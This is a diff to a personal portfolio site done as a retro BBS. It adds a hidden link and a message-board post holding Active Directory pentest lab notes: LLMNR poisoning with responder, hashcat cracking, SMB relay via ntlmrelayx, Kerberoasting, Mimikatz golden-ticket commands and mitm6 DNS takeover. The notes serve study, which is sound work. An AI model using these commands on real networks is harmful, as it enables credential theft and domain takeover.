@@ -235,6 +235,9 @@
 </head>
 <body>
 	<div class="container">
+		<div style="position: fixed; top: 10px; right: 10px; z-index: 1;">
+			<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" width="1" height="1" style="cursor: pointer;" id="bbsLink" alt="" />
+		</div>
 		<div class="portfolio-content">
 			<pre>
 ┌──────────────────────────────────────────────────────────────────────────────┐
@@ -244,7 +247,7 @@
 │                                                                              │
 └──────────────────────────────────────────────────────────────────────────────┘
 
-<a href="javascript:void(0)">[ ABOUT ]</a> <a href="javascript:void(0)">[ EXPERIENCE ]</a> <a href="javascript:void(0)">[ CONTACT ]</a> <a href="/ConnorDedicResume.pdf">[ RESUME ]</a>
+[ <a href="javascript:void(0)">ABOUT</a> ] [ <a href="javascript:void(0)">EXPERIENCE</a> ] [ <a href="javascript:void(0)">CONTACT</a> ] [ <a href="/ConnorDedicResume.pdf">RESUME</a> ]
 
 ┌──────────────────────────────────────────────────────────────────────────────┐
 │                                                                              │
@@ -312,6 +315,7 @@
 
 			setupEventListeners() {
 				document.getElementById("dialInBtn")?.addEventListener("click", () => this.showBbs());
+				document.getElementById("bbsLink")?.addEventListener("click", () => this.showBbs());
 				window.addEventListener("keydown", (e) => this.handleKeydown(e));
 			}
 
@@ -331,7 +335,11 @@
 				}
 
 				const key = e.key;
-				if (["1", "2", "3", "4", "0"].includes(key)) {
+				if (["1", "2", "3", "0"].includes(key)) {
+					if (this.state.mode === "message-board" && key === "1") {
+						this.showPostView(0);
+						return;
+					}
 					this.handleMenuSelection(key);
 				}
 			}
@@ -411,14 +419,15 @@
 					" ╚████╔╝ ╚██████╔╝███████║     ╚████╔╝ ██║██████╔╝███████╗██║ ╚═╝ ██║╚██████╔╝███████║",
 					"  ╚═══╝   ╚═════╝ ╚══════╝      ╚═══╝  ╚═╝╚═════╝ ╚══════╝╚═╝     ╚═╝ ╚═════╝ ╚══════╝",
 					"",
-					"┌────────────────────────────────────────────────────────────────────────────────────────────┐",
-					"│                                                                                            │",
-					"│  [ 1 ] ABOUT                                                                               │",
-					"│  [ 2 ] EXPERIENCE                                                                          │",
-					"│                                                                                            │",
-					"│  [ 0 ] LOG OFF                                                                             │",
-					"│                                                                                            │",
-					"└────────────────────────────────────────────────────────────────────────────────────────────┘",
+					"┌────────────────────────────────────────────────────────────────────────────────────┐",
+					"│                                                                                  │",
+					"│  [ 1 ] MESSAGE BOARD                                                              │",
+					"│  [ 2 ] FILE AREA                                                                  │",
+					"│  [ 3 ] WHO'S ONLINE                                                               │",
+					"│                                                                                  │",
+					"│  [ 0 ] LOG OFF                                                                    │",
+					"│                                                                                  │",
+					"└────────────────────────────────────────────────────────────────────────────────────┘",
 					"",
 				];
 
@@ -426,25 +435,36 @@
 					.map((line) => `<div>${this.escapeHtml(line)}</div>`)
 					.join("");
 
-				this.updateHint("[1-2] select | [0] exit | [ESC] return");
+				this.updateHint("[1-3] select | [0] exit | [ESC] return");
 			}
 
 			handleMenuSelection(key) {
-				if (this.state.mode === "about" && key === "0") {
+				if (this.state.mode === "message-board" && key === "0") {
 					this.showMainMenu();
 					return;
 				}
-				if (this.state.mode === "experience" && key === "0") {
+				if (this.state.mode === "post-view" && key === "0") {
+					this.showMessageBoard();
+					return;
+				}
+				if (this.state.mode === "file-area" && key === "0") {
+					this.showMainMenu();
+					return;
+				}
+				if (this.state.mode === "whos-online" && key === "0") {
 					this.showMainMenu();
 					return;
 				}
 
 				switch (key) {
 					case "1":
-						this.showAbout();
+						this.showMessageBoard();
 						break;
 					case "2":
-						this.showExperience();
+						this.showFileArea();
+						break;
+					case "3":
+						this.showWhosOnline();
 						break;
 					case "0":
 						this.logOff();
@@ -453,32 +473,142 @@
 			}
 
 
-			showAbout() {
-				this.state.mode = "about";
+			showMessageBoard() {
+				this.state.mode = "message-board";
 				this.mainMenu?.classList.remove("active");
 				this.menuArea?.classList.add("active");
 
 				const content = [
 					"",
-					"┌────────────────────────────────────────────────────────────────────────────────────────────┐",
-					"│  ABOUT                                                                                     │",
-					"├────────────────────────────────────────────────────────────────────────────────────────────┤",
-					"│                                                                                            │",
-					"│  Cyber Deception Engineer at Space Dynamics Laboratory.                                    │",
-					"│                                                                                            │",
-					"│  Specialized in Windows malware development, Active Directory exploitation, and           │",
-					"│  offensive tooling. Contributing researcher on novel cyber deception techniques.          │",
-					"│                                                                                            │",
-					"│  SOC analyst, CTF creator, and BS Cybersecurity (BYU-Idaho, graduating July 2026).        │",
-					"│                                                                                            │",
-					"│  Skills span C, Python, Go, PowerShell, Bash, and JavaScript with deep expertise in       │",
-					"│  AWS, Docker, Git, and Active Directory.                                                  │",
-					"│                                                                                            │",
-					"│  Certifications: AWS Cloud Practitioner, Security+, PenTest+, CySA+, PNPT.               │",
-					"│                                                                                            │",
-					"│  [ 0 ] MAIN MENU                                                                           │",
-					"│                                                                                            │",
-					"└────────────────────────────────────────────────────────────────────────────────────────────┘",
+					"┌────────────────────────────────────────────────────────────────────────────────────┐",
+					"│  MESSAGE BOARD                                                                  │",
+					"├────────────────────────────────────────────────────────────────────────────────────┤",
+					"│                                                                                  │",
+					"│  [ 1 ] Active Directory Attacks                                   2026-06-20    │",
+					"│                                                                                  │",
+					"│  [1] read | [0] main menu                                                        │",
+					"│                                                                                  │",
+					"└────────────────────────────────────────────────────────────────────────────────────┘",
+					"",
+				];
+
+				this.menuArea.innerHTML = content
+					.map((line) => `<div>${this.escapeHtml(line)}</div>`)
+					.join("");
+
+				this.updateHint("[1] read | [0] main menu | [ESC] exit");
+			}
+
+			showPostView(index) {
+				this.state.mode = "post-view";
+				this.mainMenu?.classList.remove("active");
+				this.menuArea?.classList.add("active");
+
+				const posts = [
+					{
+						title: "Active Directory Attacks",
+						content: `LAB ENVIRONMENT
+2HYDRA-DC         10.0.2.250
+punisher          10.0.2.220
+spiderman         10.0.2.221
+
+ATTACK METHODOLOGY
+1. Start with mitm6 and responder
+2. Scan to generate traffic
+3. Check websites for alternate paths
+4. Look for default creds
+5. Enumerate further based on findings
+
+Use responder on Linux, Inveigh on Windows
+
+LLMNR POISONING
+Machines in AD request access to services that don't exist.
+Attacker requests user:hash credentials.
+Target sends hash for cracking.
+
+Command: sudo responder -I <adapter> -dPv
+
+HASHCAT ATTACK MODES
+- Wordlist: hashcat -a 0 -m 400 hash dict
+- Wordlist+Rules: hashcat -a 0 -m 0 hash dict -r best64.rule
+- Brute-Force: hashcat -a 3 -m 0 hash ?a?a?a?a?a?a
+- Combinator: hashcat -a 1 -m 0 hash dict1 dict2
+
+SMB RELAY (PASS-THE-HASH)
+Use responder to catch and relay hashes.
+
+Detect vulnerable targets:
+nmap --script=smb2-security-mode.nse -p 445 <target>
+
+Look for: Message signing enabled but not required
+
+Setup relay:
+sudo ntlmrelayx.py -tf targets.txt -smb2support
+sudo impacket-ntlmrelayx -tf targets.txt -smb2support -i
+
+Connect: nc 127.0.0.1 11000
+
+KERBEROASTING
+Grab SPN hashes:
+impacket-GetUserSPNs <DOMAIN/user:pass> -dc-ip <ip> -request
+
+Crack: hashcat -m 13100 hashes.txt wordlist.txt
+
+GOLDEN TICKET
+You need: SID and krbtgt hash
+
+privilege::debug
+lsadump::lsa /inject /name:krbtgt
+kerberos::golden /User:<User> /domain:<domain> /sid:<SID> /krbtgt:<krbtgt> /id:500 /ptt
+
+IPv6 DNS TAKEOVER
+sudo mitm6 -d <domain>
+impacket-ntlmrelayx -6 -t ldaps://<DC-IPv4> -wh <fakeservice>.<domain>.local -l <loot>`
+					}
+				];
+
+				const post = posts[index];
+				const lines = post.content.split("\n");
+				const content = [
+					"",
+					"┌────────────────────────────────────────────────────────────────────────────────────┐",
+					`│  ${post.title.padEnd(78)} │`,
+					"├────────────────────────────────────────────────────────────────────────────────────┤",
+					"│                                                                                  │",
+					...lines.map(line => {
+						const padded = line.substring(0, 78).padEnd(78);
+						return `│  ${padded} │`;
+					}),
+					"│                                                                                  │",
+					"│  [ 0 ] back to message board                                                    │",
+					"│                                                                                  │",
+					"└────────────────────────────────────────────────────────────────────────────────────┘",
+					"",
+				];
+
+				this.menuArea.innerHTML = content
+					.map((line) => `<div>${this.escapeHtml(line)}</div>`)
+					.join("");
+
+				this.updateHint("[0] back | [ESC] exit");
+			}
+
+			showFileArea() {
+				this.state.mode = "file-area";
+				this.mainMenu?.classList.remove("active");
+				this.menuArea?.classList.add("active");
+
+				const content = [
+					"",
+					"┌────────────────────────────────────────────────────────────────────────────────────┐",
+					"│  FILE AREA                                                                      │",
+					"├────────────────────────────────────────────────────────────────────────────────────┤",
+					"│                                                                                  │",
+					"│  [ 1 ] ConnorDedicResume.pdf                                         120 KB    │",
+					"│                                                                                  │",
+					"│  [1] select | [0] main menu                                                     │",
+					"│                                                                                  │",
+					"└────────────────────────────────────────────────────────────────────────────────────┘",
 					"",
 				];
 
@@ -489,34 +619,23 @@
 				this.updateHint("[0] main menu | [ESC] exit");
 			}
 
-			showExperience() {
-				this.state.mode = "experience";
+			showWhosOnline() {
+				this.state.mode = "whos-online";
 				this.mainMenu?.classList.remove("active");
 				this.menuArea?.classList.add("active");
 
 				const content = [
 					"",
-					"┌────────────────────────────────────────────────────────────────────────────────────────────┐",
-					"│  EXPERIENCE                                                                                │",
-					"├────────────────────────────────────────────────────────────────────────────────────────────┤",
-					"│                                                                                            │",
-					"│  [ CURRENT ROLE ]                                                                          │",
-					"│  Cyber Deception Engineer - Space Dynamics Laboratory (Jan–May 2026)                      │",
-					"│  └─ Cataloged and developed cyber deception techniques                                     │",
-					"│  └─ Conducted research on novel approaches across AI, ICS, AD, and bespoke systems        │",
-					"│  └─ Contributing to upcoming published paper on cyber deception                           │",
-					"│                                                                                            │",
-					"│  [ EXPERTISE ]                                                                             │",
-					"│                                                                                            │",
-					"│  OFFENSIVE: Windows malware, AD exploitation, red team operations, reverse eng            │",
-					"│  └─ Impacket, BloodHound, Mimikatz, Empire, custom tooling                                │",
-					"│                                                                                            │",
-					"│  DEFENSIVE: SOC operations, threat hunting, incident response, detection                  │",
-					"│  └─ Splunk, Palo Alto, Crowdstrike, Suricata, Security Onion                             │",
-					"│                                                                                            │",
-					"│  [ 0 ] MAIN MENU                                                                           │",
-					"│                                                                                            │",
-					"└────────────────────────────────────────────────────────────────────────────────────────────┘",
+					"┌────────────────────────────────────────────────────────────────────────────────────┐",
+					"│  WHO'S ONLINE                                                                   │",
+					"├────────────────────────────────────────────────────────────────────────────────────┤",
+					"│                                                                                  │",
+					"│  > SYSOP (idle 2m)                                                              │",
+					"│  > you (active)                                                                 │",
+					"│                                                                                  │",
+					"│  [ 0 ] main menu                                                                │",
+					"│                                                                                  │",
+					"└────────────────────────────────────────────────────────────────────────────────────┘",
 					"",
 				];
 
